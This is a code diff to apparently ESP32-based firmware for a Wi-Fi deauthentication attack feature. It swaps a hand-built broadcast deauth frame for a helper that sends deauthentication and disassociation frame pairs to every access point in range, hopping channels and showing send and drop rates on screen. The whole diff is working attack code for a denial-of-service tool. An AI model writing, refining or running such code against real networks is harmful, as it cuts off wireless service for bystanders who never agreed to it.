@@ -8,6 +8,7 @@
 #include "input.h"
 #include "radio.h"
 #include "wifi_types.h"
+#include "wifi_deauth_frame.h"
 #include <WiFi.h>
 #include <esp_wifi.h>
 
@@ -21,31 +22,22 @@ static volatile int s_b_target_n = 0;
 static volatile int s_b_cursor = 0;
 static volatile bool     s_b_running = false;
 static volatile uint32_t s_b_sent    = 0;
-
-static uint8_t s_b_frame[26] = {
-    0xC0, 0x00, 0x00, 0x00,
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   /* dst = broadcast */
-    0,0,0,0,0,0,                          /* src = AP */
-    0,0,0,0,0,0,                          /* bssid = AP */
-    0x00, 0x00,
-    0x07, 0x00,
-};
+static volatile uint32_t s_b_errs    = 0;
+static uint16_t          s_b_seq     = 0;
 
 static void broad_task(void *)
 {
     /* Rotate through every AP: hop channel, blast a burst of deauths,
-     * move on. Fastest total coverage. */
+     * move on. Fastest total coverage. Each iteration fires 16 pairs =
+     * 32 frames (deauth+disassoc) per AP per rotation. */
     while (s_b_running) {
         if (s_b_target_n == 0) { delay(100); continue; }
         const db_target_t &t = s_b_targets[s_b_cursor % s_b_target_n];
         esp_wifi_set_channel(t.channel ? t.channel : 1, WIFI_SECOND_CHAN_NONE);
-        memcpy(s_b_frame + 10, t.bssid, 6);
-        memcpy(s_b_frame + 16, t.bssid, 6);
-        /* Deeper burst per target → fewer rotations per second → calmer
-         * UI while still saturating kick-frames per AP. */
-        for (int i = 0; i < 32 && s_b_running; ++i) {
-            esp_wifi_80211_tx(WIFI_IF_STA, s_b_frame, sizeof(s_b_frame), false);
-            s_b_sent++;
+        for (int i = 0; i < 16 && s_b_running; ++i) {
+            int ok = wifi_deauth_broadcast(t.bssid, &s_b_seq);
+            s_b_sent += ok;
+            s_b_errs += (2 - ok);
             delay(6);
         }
         s_b_cursor++;
@@ -90,7 +82,9 @@ void feat_wifi_deauth_broadcast(void)
 
     esp_wifi_set_promiscuous(true);
     s_b_sent = 0;
+    s_b_errs = 0;
     s_b_cursor = 0;
+    s_b_seq = (uint16_t)(esp_random() & 0x0FFF);
     s_b_running = true;
     xTaskCreate(broad_task, "deauth_all", 3072, nullptr, 4, nullptr);
 
@@ -124,7 +118,8 @@ void feat_wifi_deauth_broadcast(void)
             last_sent = s_b_sent;
             d.setTextColor(fps > 40 ? T_ACCENT : T_WARN, T_BG);
             d.setCursor(4, BODY_Y + 36);
-            d.printf("rate   : %lu/s", (unsigned long)fps);
+            d.printf("rate   : %lu/s  drop:%lu",
+                     (unsigned long)fps, (unsigned long)s_b_errs);
 
             ui_freq_bars(SCR_W - 70, BODY_Y + 16, 4, 28);
 
